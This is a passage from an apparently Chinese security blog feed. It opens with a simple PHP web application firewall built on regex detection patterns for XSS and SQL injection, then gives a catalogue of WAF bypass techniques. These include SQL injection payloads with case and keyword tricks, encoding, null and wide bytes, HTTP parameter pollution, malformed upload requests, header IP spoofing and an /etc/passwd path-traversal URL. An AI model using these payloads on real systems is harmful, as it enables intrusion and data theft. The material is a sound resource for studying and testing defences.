class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;SimpleWAF&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$patterns&lt;/span&gt; = [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;/(&amp;lt;|%3C).*script.*(&amp;gt;|%3E)/i&amp;#x27;&lt;/span&gt;,  &lt;span class=&#34;comment&#34;&gt;// XSS&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;/(\%27)|(\&amp;#x27;)|(\-\-)|(\%23)|(#)/i&amp;#x27;&lt;/span&gt;,  &lt;span class=&#34;comment&#34;&gt;// SQL Injection&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;#x27;/select\b|insert\b|update\b|delete\b|drop\b|union\b/i&amp;#x27;&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;// SQL Keywords&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;filterRequest&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;filterRequest&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;foreach&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$key&lt;/span&gt; =&amp;gt; &lt;span class=&#34;variable&#34;&gt;$value&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;checkMalicious&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$value&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;foreach&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$key&lt;/span&gt; =&amp;gt; &lt;span class=&#34;variable&#34;&gt;$value&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;checkMalicious&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$value&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;foreach&lt;/span&gt; (&lt;span class=&#34;variable&#34;&gt;$_COOKIE&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$key&lt;/span&gt; =&amp;gt; &lt;span class=&#34;variable&#34;&gt;$value&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;checkMalicious&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$value&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;checkMalicious&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$value&lt;/span&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;foreach&lt;/span&gt; (&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;patterns &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$pattern&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$pattern&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$value&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;blockRequest&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;blockRequest&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;title function_ invoke__&#34;&gt;header&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;HTTP/1.1 403 Forbidden&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;403 Forbidden - Your request has been blocked by the WAF.&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;exit&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 初始化 WAF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;SimpleWAF&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 继续处理正常请求&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Hello, World!&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h2 id=&#34;waf-bypass&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#waf-bypass&#34;&gt;#&lt;/a&gt; WAF Bypass&lt;/h2&gt;
&lt;h3 id=&#34;超过waf配额绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#超过waf配额绕过&#34;&gt;#&lt;/a&gt; 超过 WAF 配额绕过&lt;/h3&gt;
&lt;p&gt;为不干扰到网站的正常运行，配置 WAF 检测额度内进行过滤，有些 WAF 就会设置如果数据包长度超过所检测的长度，就会对部分数据包或者是数据包的部分内容进行无检测 “放行”。&lt;/p&gt;
&lt;h4 id=&#34;增加参数个数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#增加参数个数&#34;&gt;#&lt;/a&gt; 增加参数个数&lt;/h4&gt;
&lt;p&gt;配置的原因，例如 safedog，只会检测前 100 个参数，把自己的执行语句放在 100 个之后&lt;/p&gt;
&lt;h4 id=&#34;增加参数长度&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#增加参数长度&#34;&gt;#&lt;/a&gt; 增加参数长度&lt;/h4&gt;
&lt;p&gt;文件上传漏洞利用时，增加无意义数据，webshell 放在最后面；&lt;/p&gt;
&lt;p&gt;SQL 注入时，增加 URL 编码长度，并注释掉；&lt;/p&gt;
&lt;p&gt;xss 测试时加入无意义内容&lt;/p&gt;
&lt;h4 id=&#34;增加waf负载&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#增加waf负载&#34;&gt;#&lt;/a&gt; 增加 WAF 负载&lt;/h4&gt;
&lt;p&gt;向 WAF 发送大量正常数据包，并发送异常数据包，导致站点流量过大，可能会对部分数据包进行检查，注意分寸，避免造成宕机。&lt;/p&gt;
&lt;h3 id=&#34;构造异常数据包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#构造异常数据包&#34;&gt;#&lt;/a&gt; 构造异常数据包&lt;/h3&gt;
&lt;h4 id=&#34;双参数绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#双参数绕过&#34;&gt;#&lt;/a&gt; 双参数绕过&lt;/h4&gt;
&lt;p&gt;网站有一个 id 参数，在数据包中包含两个 id 参数进去，WAF 可能只检测第一个，第二个就会被服务器执行&lt;/p&gt;
&lt;h4 id=&#34;请求方式转换&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#请求方式转换&#34;&gt;#&lt;/a&gt; 请求方式转换&lt;/h4&gt;
&lt;p&gt;根据对 WAF 配置的不同&lt;/p&gt;
&lt;p&gt;如果 WAF 只检验 GET 类型的包，忽略 POST 类型的包，修改数据包类型尝试绕过&lt;/p&gt;
&lt;p&gt;如果 WAF 只检验 POST 类型的包，忽略 GET 类型的包，修改数据包类型尝试绕过&lt;/p&gt;
&lt;p&gt;有时，也可尝试，把数据包改为 request 类型等或根本就不存在的其他类型&lt;/p&gt;
&lt;p&gt;另一方面：POST 在提交数据的时候有两种方式，第一种方式是使用 urlencode 的方式提交，第二种方式是使用 form-data 的方式提交。当我们在测试站点的时候，如果发现 POST 提交的数据被过滤掉了，此时可以考虑使用 form-data 的方式去提交。&lt;/p&gt;
&lt;h3 id=&#34;绕过匹配&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#绕过匹配&#34;&gt;#&lt;/a&gt; 绕过匹配&lt;/h3&gt;
&lt;h4 id=&#34;大小写变换&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#大小写变换&#34;&gt;#&lt;/a&gt; 大小写变换&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;?id=-1’ UnIOn SeLEct 1,VERsion(),3&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;将关键词进行等价替换&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#将关键词进行等价替换&#34;&gt;#&lt;/a&gt; 将关键词进行等价替换&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Hex() bin()&lt;/code&gt;  等价于 &lt;code&gt;ascii() &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Sleep()&lt;/code&gt;  等价于  &lt;code&gt;benchmark()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Mid()substring()&lt;/code&gt;  等价于  &lt;code&gt;substr() &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;@@user &lt;/code&gt; 等价于 &lt;code&gt;User()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;@@Version &lt;/code&gt; 等价于  &lt;code&gt;version()&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;**greatest 替换 &amp;gt; **&lt;/p&gt;
&lt;p&gt;&lt;code&gt;greatest&lt;/code&gt;  返回两个值中大的那个&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?id=-1’ union select greatest(ascii(substr(database(),0,1)),1) --+&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;least  替换 &amp;lt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;least&lt;/code&gt;  返回两个值中小的那个&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?id=-1’ union select least(ascii(substr(database(),0,1)),1000000) --+&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;strcmp 函数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;比较两个值大小，相等返回 0 后者比前者大返回 - 1 小返回 1&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?id=-1’ union select srtcmp(ascii(substr(database(),0,1)),100) --+&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;in 替换 =&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;相等返回 1 不相等返回 0&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?id=-1’ union select substr(database()) in (“u”) --+&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;between and 替换 =&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?id=-1’ union select substr(database()) between “a” and “u” --+&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;form for&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;盲注过滤逗号&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?id=-1’ union select(database() form 0 for 1) --+&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;limit A offset B&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当过滤逗号时，limit 后面只能有一个参数，表示要取的数量，offset 表示跳过数量&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;select * from users limit 3 offset 2&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;使用嵌套&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用嵌套&#34;&gt;#&lt;/a&gt; 使用嵌套&lt;/h4&gt;
&lt;p&gt;对某些关键字替换为空，尝试采用嵌套双写进行绕过&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SELselectECT、UNunionION&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;使用编码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用编码&#34;&gt;#&lt;/a&gt; 使用编码&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Json&lt;br&gt;
Unicode&lt;br&gt;
base64&lt;br&gt;
urlencode&lt;br&gt;
html&lt;br&gt;
Serialize&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;双重编码：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;WAF 又是会解码后过滤&lt;/p&gt;
&lt;h4 id=&#34;特殊符号&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#特殊符号&#34;&gt;#&lt;/a&gt; 特殊符号：&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;*+(-)(@)(!) 等替代空格 *&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;select+database()&lt;/p&gt;
&lt;p&gt;select@database()&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;xor 逻辑异或&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;任意一个数为 NULL 时，返回 NULL&lt;/p&gt;
&lt;p&gt;非 NULL 的数，逻辑真假值相异，返回 1，否则为 0&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;database()=“admin” xor 0&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;/**/  ()  %0a  ``  2个空格&lt;/code&gt;  替代 空格&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;select/**/database()&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;替换 and or not xor&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;and ----&amp;gt; &amp;amp;&amp;amp;    ,or ------&amp;gt; ||  ,xor ------&amp;gt; |     ,not -----&amp;gt;  !&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;替换 =&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;like   rlike&lt;/p&gt;
&lt;p&gt;where id rlike 1&lt;/p&gt;
&lt;p&gt;where id like “admin”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;union all select&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;select password from users where id rlike 1 union all select version();&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;注释符加换行绕过&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://fc04db.oss-cn-hangzhou.aliyuncs.com/image/202406072010973.png&#34; alt=&#34;image-20240607201043694&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;select #a database()&lt;/p&gt;
&lt;p&gt;selelct %23%0a database()&lt;/p&gt;
&lt;p&gt;(%23 表示注释  %0a 表示换行)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;空字节&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;有的过滤会碰到空字节会中止过滤&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?id=1 a%00nd 1=2……&lt;/p&gt;
&lt;p&gt;?id=1 %00 and 1=2……&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;宽字节&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;union = uю%69яю这里把 i 不用宽字节 直接 url 编码 其他的字符都用对应的宽字节&lt;br&gt;
 select = こхlх%уt //t 不编码 其他的都宽字节 中间插上 %&lt;br&gt;
 from = цR%яэ // 宽字节 +%&lt;br&gt;
 空格 =%20=%ва //в是 2 的款字符 а是 0 的宽字符&lt;br&gt;
，= Ь //, 号的宽字节&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;http-参数污染&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#http-参数污染&#34;&gt;#&lt;/a&gt; http 参数污染&lt;/h3&gt;
&lt;p&gt;利用参数污染来导致网站和安全狗接受数据的不一致性，实现绕过的操作。当 get 方式进行传参时，经过 &amp;amp; 符号传入多个参数，WAF 可能只检测第一个参数的值，然后台却检测最后一个传入的值，此时能够绕过 WAF 的防护&lt;/p&gt;
&lt;p&gt;下图即每种服务器获得到的参数&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://fc04db.oss-cn-hangzhou.aliyuncs.com/image/202406072026847.png&#34; alt=&#34;image-20240607202628738&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?id=1/**&amp;amp;id=-1&#39; union select 1,database(),3 #*/ &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;安全狗收到的：  &lt;code&gt;1/**&amp;amp;id=-1&#39; union select 1,database(),3 #*/    &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;被注释，没法执行，安全狗会忽略&lt;/p&gt;
&lt;p&gt;网站收到的：  &lt;code&gt;-1&#39; union select 1,database(),3 #*/     &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;被带入执行&lt;/p&gt;
&lt;h3 id=&#34;构造畸形请求包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#构造畸形请求包&#34;&gt;#&lt;/a&gt; &lt;strong&gt;构造畸形请求包&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;(1) 删掉 content-type&lt;/p&gt;
&lt;p&gt;(2) 构造多个 filename&lt;/p&gt;
&lt;p&gt;(3) content-type 后面加 TABLE 键&lt;/p&gt;
&lt;p&gt;(4) 换行 boundary&lt;/p&gt;
&lt;p&gt;(5) 文件名前面加空格&lt;/p&gt;
&lt;p&gt;(6) 文件名前面加单引号&lt;/p&gt;
&lt;h3 id=&#34;白名单bypass&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#白名单bypass&#34;&gt;#&lt;/a&gt; 白名单 Bypass&lt;/h3&gt;
&lt;p&gt;方式一：IP 白名单&lt;/p&gt;
&lt;p&gt;从网络层获取的 ip，这种一般伪造不来，如果是应用层的获取的 IP，这样就可能存在伪造白名单 IP 造成 bypass。&lt;/p&gt;
&lt;p&gt;测试方法：修改 http 的 header 来 bypass WAF&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;X-forwarded-for&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-remote-IP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-originating-IP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;x-remote-addr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;X-Real-ip&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;方式二：静态资源&lt;/p&gt;
&lt;p&gt;特定的静态资源后缀请求，常见的静态文件 (.js .jpg .swf .css 等等)，类似白名单机制，WAF 为了检测效率，不去检测这样一些静态文件名后缀的请求。&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://10.9.9.201/sql.php/1.js?id=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# Aspx/php只识别到前面的.aspx/.php 后面基本不识别&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;方式三：url 白名单&lt;/p&gt;
&lt;p&gt;为了防止误拦，部分 WAF 内置默认的白名单列表，如 admin/manager/system 等管理后台。只要 url 中存在白名单的字符串，就作为白名单不进行检测。常见的 url 构造姿势：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://10.9.9.201/sql.php/admin.php?id=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://10.9.9.201/sql.php?a=/manage/&amp;amp;b=../etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://10.9.9.201/../../../manage/../sql.asp?id=2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;WAF 通过 /manage/&amp;quot; 进行比较，只要 uri 中存在 /manage/ 就作为白名单不进行检测，这样我们可以通过 /sql.php?a=/manage/&amp;amp;b=…/etc/passwd 绕过防御规则。&lt;/p&gt;
&lt;p&gt;方式四：爬虫白名单&lt;/p&gt;
&lt;p&gt;部分 WAF 有提供爬虫白名单的功能，识别爬虫的技术一般有两种：&lt;/p&gt;
&lt;p&gt;1、 根据 UserAgent 2、通过行为来判断&lt;/p&gt;
&lt;p&gt;UserAgent 可以很容易欺骗，我们可以伪装成爬虫尝试绕过。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2024/05/29/about-XML/</guid>
            <title>about XML</title>
            <link>http://example.com/2024/05/29/about-XML/</link>
            <pubDate>Wed, 29 May 2024 12:24:33 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;xml&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xml&#34;&gt;#&lt;/a&gt; XML&lt;/h2&gt;
&lt;p&gt;XML 指可扩展标记语言（EXtensible Markup Language）。&lt;br&gt;
XML 的设计宗旨是&lt;strong&gt;传输数据&lt;/strong&gt;，而不是显示数据。&lt;br&gt;
XML 是 W3C 的推荐标准。&lt;br&gt;
XML 不会做任何事情。XML 被设计用来&lt;strong&gt;结构化、存储以及传输信息&lt;/strong&gt;。&lt;br&gt;
XML 语言没有预定义的标签。&lt;/p&gt;
&lt;p&gt;XML 和 HTML 之间的差异：&lt;/p&gt;
&lt;p&gt;1、XML 不是 HTML 的替代。&lt;br&gt;
2、XML 和 HTML 为不同的目的而设计：&lt;/p&gt;
